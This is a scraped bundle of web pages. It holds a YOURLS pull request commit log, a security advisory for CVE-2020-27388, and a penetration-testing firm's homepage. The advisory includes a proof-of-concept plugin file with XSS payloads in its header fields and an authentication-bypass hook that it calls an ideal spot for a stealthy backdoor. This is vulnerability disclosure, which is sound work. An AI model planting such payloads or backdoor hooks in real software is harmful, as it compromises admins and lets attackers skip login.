  - Upgrading composer/ca-bundle (1.3.1 => 1.3.4)
  - Upgrading geoip2/geoip2 (v2.12.2 => v2.13.0)
  - Upgrading ozh/bookmarkletgen (1.2 => 1.2.2)
  - Upgrading pomo/pomo (v1.4.1 => v1.5.0)
  - Upgrading rmccue/requests (2.0.2 => v2.0.5)
  - Upgrading spatie/array-to-xml (2.16.0 => 2.17.1)
  - Upgrading symfony/polyfill-intl-idn (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-intl-normalizer (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-mbstring (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-php72 (v1.25.0 => v1.27.0)

* Update certificates

* Update GeoIP DB ([YOURLS#3488](https://github.com/YOURLS/YOURLS/pull/3488))

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Bump shivammathur/setup-php from 2.23.0 to 2.24.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.23.0 to 2.24.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.23.0...2.24.0](https://github.com/shivammathur/setup-php/compare/2.23.0...2.24.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP workflow; set-output is deprecated

* Update cert workflow: set-output is deprecated

* Use the correct version 9 of PHPUnit

* Improve Actions name readability

* Update GeoIP DB ([YOURLS#3499](https://github.com/YOURLS/YOURLS/pull/3499))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Support usernames containing brackets ([YOURLS#3365](https://github.com/YOURLS/YOURLS/pull/3365))

* wrapped $user in preg_quote function
* updated auth test for special character in username

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Use sandbox for all included files ([YOURLS#3478](https://github.com/YOURLS/YOURLS/pull/3478))

- updated calls to functions
- deprecate function yourls_activate_plugin_sandbox()
- add unit tests
- log loaded files
- tweak yourls_debug_log to allow early uses

Co-authored-by: e-ht <1045813+e-ht@users.noreply.github>
Co-authored-by: eht <1045813+e-ht@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

Closes [YOURLS#3321](https://github.com/YOURLS/YOURLS/issues/3321)

* Fix bug where editing a URL will update the first entry in the table ([YOURLS#3485](https://github.com/YOURLS/YOURLS/pull/3485))

Pass id to yourls_table_edit_row() so the correct line in the table is updated.
Fixes [YOURLS#3485](https://github.com/YOURLS/YOURLS/pull/3485)

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Remove cookies from $_REQUEST ([YOURLS#3516](https://github.com/YOURLS/YOURLS/pull/3516))

Closes [YOURLS#3383](https://github.com/YOURLS/YOURLS/issues/3383)
Closes [YOURLS#3351](https://github.com/YOURLS/YOURLS/pull/3351)

* Make Googlebot indexing filterable ([YOURLS#3517](https://github.com/YOURLS/YOURLS/pull/3517))

Closes [YOURLS#3486](https://github.com/YOURLS/YOURLS/issues/3486)

* Fix click threshold in admin view ([YOURLS#3518](https://github.com/YOURLS/YOURLS/pull/3518))

Fixes [YOURLS#3460](https://github.com/YOURLS/YOURLS/issues/3460)

* Update GeoIP DB ([YOURLS#3519](https://github.com/YOURLS/YOURLS/pull/3519))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3526](https://github.com/YOURLS/YOURLS/pull/3526))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Comment what "cache" means here

[skip ci]

* Fixes bookmarklets with URL containing special chars ([YOURLS#3527](https://github.com/YOURLS/YOURLS/pull/3527))

Fixes [YOURLS#3523](https://github.com/YOURLS/YOURLS/issues/3523)

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update CHANGELOG

[skip ci]

* Fix typo in comment ([YOURLS#3535](https://github.com/YOURLS/YOURLS/pull/3535))

* Bump version for 1.9.2 ([YOURLS#3537](https://github.com/YOURLS/YOURLS/pull/3537))

* Bump version

[skip ci]

* sync to upstream/master

---------

Signed-off-by: Aaron <admin@datahoarder.dev>
Signed-off-by: dependabot[bot] <support@github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>
Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>
Co-authored-by: Audrey Maniez <amaniez@access42.net>
Co-authored-by: paulgoodchild <paulgoodchild@users.noreply.github.com>
Co-authored-by: Michael Bemmerl <mail@mx-server.de>
Co-authored-by: JÃ©rÃ©my K <JeremyKeusters@users.noreply.github.com>
Co-authored-by: hdkjjsk612 <47492172+hdkjjsk612@users.noreply.github.com>
Co-authored-by: Ingo Kleiber <ikleiber@gmail.com>
Co-authored-by: ueickmann <45387393+ueickmann@users.noreply.github.com>
Co-authored-by: Aaryan Porwal <54525904+aaryanporwal@users.noreply.github.com>
Co-authored-by: Hitesh Jethva <hitjethva@gmail.com>
Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: Florian Latifi <mail@florian-latifi.at>
Co-authored-by: The Zach <zach2825@users.noreply.github.com>
Co-authored-by: Leo Viezens <leo.viezens@web.de>
Co-authored-by: Bibo-Joshi <hinrich.mahler@freenet.de>
Co-authored-by: Dan Benton <dan@dogsbody.com>
Co-authored-by: Aaron <admin@datahoarder.dev>
Co-authored-by: simon-eller <63782380+simon-eller@users.noreply.github.com>
Co-authored-by: LinuxStans <78315004+LinuxStans@users.noreply.github.com>
Co-authored-by: Jay Holtslander <j.holtslander@gmail.com>
Co-authored-by: Karsten Hoffmeyer <mediawiki@kghoffmeyer.de>
Co-authored-by: Jonathan Dahan <55917666+jonathandhn@users.noreply.github.com>
Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
Co-authored-by: Jens Spanier <42373861+Virinum@users.noreply.github.com>
Co-authored-by: David Faber <dcfaber@gmail.com>
Co-authored-by: Peter Gasser <github@boedah.de>
Co-authored-by: Bryan Joshua Pedini <b.pedini@bjphoster.com>
Co-authored-by: Kaito Udagawa <umireon@gmail.com>
Co-authored-by: Dan Raper <djr2468@gmail.com>
Co-authored-by: jaas666 <30204147+jaas666@users.noreply.github.com>
Co-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>
Co-authored-by: yourls-bot[bot] <104057305+yourls-bot[bot]@users.noreply.github.com>
Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: Barry Hughes <3594411+barryhughes@users.noreply.github.com>
Co-authored-by: JT Smith <nexxai@gmail.com>
Co-authored-by: SXN31 <43016545+SXN31@users.noreply.github.com>
Co-authored-by: jarebear6expepjozn6rakjq5iczi3irqwphcvbswgkahd6b6twnxxid <1045813+jarebear6expepjozn6rakjq5iczi3irqwphcvb@users.noreply.github.com>
Co-authored-by: 4BRobby <robby@4bytes.de>
Co-authored-by: firfin <marck@wickedfruit.com>
Co-authored-by: Rodney Stromlund <Rodney.Stromlund@wnco.com>
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FYOURLS%2FYOURLS%2Fpull%2F2761)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@ozh](https://avatars.githubusercontent.com/u/223647?s=52&v=4)](/ozh) [![@spwn3r49sd3r00](https://avatars.githubusercontent.com/u/14950069?s=52&v=4)](/spwn3r49sd3r00) [![@johnjhacking](https://avatars.githubusercontent.com/u/39013067?s=52&v=4)](/johnjhacking)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from johnjhacking.com_1a83e97c_20250119_130143.html ===


* [Home](/)
* [Blog](/blog)
* [Research](/research)

* [Home](https://johnjhacking.com)
* [Blog](/blog)
* [Research](/research)

# CVE-2020-27388: YOURLS 1.5 - 1.7.10, Multiple Stored Cross Site Scripting (XSS) Vulnerabilities in Admin Panel

Multiple Stored Cross Site Scripting (XSS) vulnerabilities exist in the YOURLS Admin Panel, Versions 1.5 - 1.7.10. An authenticated user must modify a PHP Plugin with a malicious payload and upload it, resulting in multiple stored XSS issues.

Published on Oct 23, 2020

Reading time: 2 minutes.

---

# **Potential Abuse on a hooked Function**

There is a potential for abuse with any plugins that implement the hook function âshunt\_is\_valid\_userâ. In the code below we simply demonstrate that authentication can be completely bypassed by returning TRUE in the hooked function. This would be an ideal place for a stealthy backdoor or any other malicious code. It should be noted that this itself is not a vulnerability, but has a potential to be misused and plugins that use this hook should be checked.

Also note that the plugin will have to be activated in order to run the malicious hook. You can use the plugin below and activate it, and you will notice that you no longer need to log in.

# **Affected Version(s)**

YOURLS 1.5 - 1.7.10

# **Steps to Replicate**

1.Follow the instructions on[https://yourls.org/#Install](https://yourls.org/#Install "https://yourls.org/#Install") for setting up YOURLS in a local environment for testing or test in your existing instance.

2. Install version â1.7.9â from[https://github.com/YOURLS/YOURLS/releases](https://yourls.org/#Install "https://yourls.org/#Install"). [*We noticed that when the application is set up, it uses version 1.7.10 even though the latest version is 1.7.9.*]

3. Create a new directory in YOURLS/user/plugins directory named âexploitâ

4. In that directory, create âplugin.phpâ and paste the following code and save the file:

```
<?php

/*

Plugin Name: anything"><img src=x onerror=prompt(ânameâ)>

Plugin URI: plugin URI

Description: anything"><img src=x onerror=prompt('desc')>

Version: anything"><img src=x onerror=prompt('version')>

Author: anything"><img src=x onerror=prompt('author')>

Author URI: author URI

\*/

// No direct call

if( !defined( 'YOURLS_ABSPATH' ) ) die();

// This is code demonstrating how a malicious plugin can hook and bypass authentication

yourls_add_filter( 'shunt_is_valid_user' , 'exploit' );

function exploit(){

return TRUE;

}

```

5. Login to the /admin path and go to âManage Pluginsâ.

6. Upon loading the page, you will observe 4 separate instances of Stored XSS.

![](/uploads/xss1.png)

![](/uploads/xss2.png)

![](/uploads/xss3.png)

![](/uploads/xss4.png)

# **References**

[https://github.com/YOURLS/YOURLS/pull/2761](https://github.com/YOURLS/YOURLS/pull/2761 "https://github.com/YOURLS/YOURLS/pull/2761")

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27388](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27388 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27388")

# Credits

[Shail Patel](https://twitter.com/shail_official "Shail Patel")

[Lost Rabbit Labs](https://www.lostrabbitlabs.com/ "Lost Rabbit Labs")

[John](https://github.com/johnjhacking "John Jackson")

![Creative Commons](https://mirrors.creativecommons.org/presskit/icons/cc.svg)
![CC-BY](https://mirrors.creativecommons.org/presskit/icons/by.svg)
2020
John



=== Content from www.lostrabbitlabs.com_42c32790_20250119_142804.html ===
[Skip to main content](#thememaincontent)

[![Lost Rabbit Labs - Full Spectrum Teaming & CyberSecurity](/files/pics/LRLlogo-R-TM.png)](/ "Logo")

* [Home](/)
* [Services](/services)
* [WisQuas](/wisquas)
  + [WisQuas How-To](/manual-how-to)
* [About Us](/about-us)
* More
  + [Contact Us](/contact)
  + [Blog](/blogs)

## Take your Cybersecurity Defenses to the Next Level

Identifying existing vulnerabilities and threats by performing Threat Landscape Assessments, Penetration Testing,Â and Full Spectrum Teaming efforts is essential to ensure that your company has the necessary controls, monitoring, detection, alerting, and response in order to help protect it from becoming the next victim of a Cyber-attack. Do you know what your Threat Landscape really looks like to an attacker? Perform an all-in-one Threat Landscape Assessment, Vulnerability & Misconfiguration Scan, Digital Footprint & Inventory, and OSINT Investigation, with WisQuasâ¢.

[View Services](/services)
## Learn More About WisQuasâ¢

Improve your Time To Remediation (TTR), with WisQuas, and perform next level Digital Footprint Discovery and Asset Analysis Crawling around your domain.
[Request A Demo](/contact)
[More Information](/wisquas)
[Go To WisQuas](https://wisquas.lostrabbitlabs.com)
## Current News, Info, & Updates

![](/files/pics/PartnershipBarador.png)

![](/files/pics/blog-pics/GimmeHead3rz-1.png)
### GimmeHead3rz Tool Release

During Web Application & API Penetration Testing engagements there is always a need to evaluate headers and cookies of given endpoints in order to ensure security requirements are being met. Currently, many of the existing open-source tools for header analysis seem to be outdated, missing newer headers, inconsistent with results, and thus lacking proper detections. With this as the inspiration, our team set out to create an open-source solution to make analyzing headers easier for both Offensive and Defensive security teams.
[Read More](https://www.lostrabbitlabs.com/blogs/post/GimmeHead3rz-Tool-Release)

## Who We Are, What We Do, & Our Passion For CyberSecurity

We are a small group ofÂ Rabbit-Holing Researchers, Developers, and HackersÂ who provideÂ Professional Offensive and Defensive Security ServicesÂ to clients of all sizes. We specialize in delivering high-value, actionable tools, information, and data enrichments with a strong focus on identification and removal of potential attack paths, vulnerabilities and information leakages around digital, and physical assets. Our commitment is to decrease cybercrime losses for our clients by strengthening their defensive cybersecurity posture and awareness, through collaborative teaming efforts and trusted partnerships.
## Full Spectrum Teaming & CyberSecurity Services

##### Penetration Testing

Our Penetration Testing services cover a broad range including Internal and External Networks, Web Applications, API endpoints, Mobile Applications.

* Internal/External Network Penetration Testing
* Physical Security Assessments
* Web Application & API Testing
* Mobile Application Testing
* WiFi / Bluetooth / RFID Testing
* IoT / Hardware Testing
* Phone, Video & Email Phishing Campaigns

[Penetration Testing Services](/services#Offensive-Security-Services)
##### OSINT Investigations & Threat Intel

Our OSINT Investigations & Threat Intel services include Attribution Investigation, Brand and Reputation Evaluations as well as Threat Landscape Awareness.

* Digital Footprint Discovery
* Credential Breach & Data Leak Detection
* Attribution Investigation & Reporting
* Brand Reputation Evaluation
* Incident Response & Remediation

[OSINT Investigation Services](/services#OSINT-Investigations)
##### Defensive Security Services & Support

Our professional Security Team can help your organization evolve its security posture, and internal procedures through our Defensive Security Services.

* Policies, Procedures & Security Posturing
* Ransomware Simulation & Awareness
* VCISO Services & Support
* Custom Training & Awareness Programs
* Code Inspection & Review
* Digital Asset Monitoring
* Threat Landscape Awareness

[Defensive Security Services](/services#Defensive-Security-Services)
##### WisQuas - Scanning & Monitoring

Perform an all-in-one Threat Landscape Assessment, Vulnerability & Misconfiguration Scan, Digital Footprint & Inventory, and OSINT Investigation, with WisQuas.

âYou are only as strong as your weakest link. When you check a chain for weakness, do you only check one link?â

* Full-spectrum use-cases (Red/Blue/Purple Team)
* Bug Bounty / Threat Hunting

[WisQuas Services](/wisquas)

## Sample Reports

#### WisQuasâ¢ - Threat Landscape AssessmentDigital Footprint Discovery & Asset Analysis Reports

After a domain has been scanned and thoroughly analyzed by one of our Strategic Security Team Analysts, the findings and issues found throughout the domain are categorized and condensed into this ~3 page report for your security team.

[Download WisQuas Sample Report](https://zfrmz.com/VIp2JZsepBJ9Tfxq9kum)
![](/files/pics/WisQuas-Sample-Report.PNG)
#### 8-HOUR ENGAGEMENTExternal/Internal Networks, Web Application, Mobile, IoT, Hardware, Physical

The purpose of this condensed test is to provide an affordable and âquick but thoroughâ assessment around your entire domain, a network segment, a particular website or application, or a provided data point. Helps identify your organizationsâ baseline security posturing and prioritize which weaknesses need to be addressed immediately.

[Download Sample 8-Hour Report](https://zfrmz.com/rDhsULxfb1Fx3drnfkRK)
![](/files/pics/osint-sample.png)
![](/files/pics/Screenshot%202024-02-16%20145546.png)
#### 40-HOUR ENGAGEMENTExternal/Internal Networks, Web Application, Mobile, IoT, Hardware, Physical

Having more time to test and explore allows for deeper inspection of digital assets and services. This discounted effort includes a more thorough examination of your domain, applications and other digital assets in your organization.

[Download Sample 40-Hour Report](https://zfrmz.com/e3ency2jQcgfsNF1vLr3)

## Get in touch with us about our services

[Contact Us](/contact)

Lost Rabbit Labs, Inc.

2255 S. Wadsworth Blvd Ste 106
Lakewood, CO 80227

### Follow us on Social Media

[![](/files/pics/linkedin.png)](https://www.linkedin.com/company/lost-rabbit-labs/)
[![](/files/pics/twitter.png)](https://twitter.com/lostrabbitlabs)
[![](/files/pics/twitch.png)](https://www.twitch.tv/lostrabbitlabs)

#### (904) 513-1337

#### info@lostrabbitlabs.com

Copyright 2025 Â© All rights reserved.Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  [Privacy Policy](/privacy)Â Â Â Â Â Â Â  [Terms & Conditions](https://wisquas.lostrabbitlabs.com/terms) Â  Â  Â  Â [Refund Policy](/refund-policy "Refund Policy")


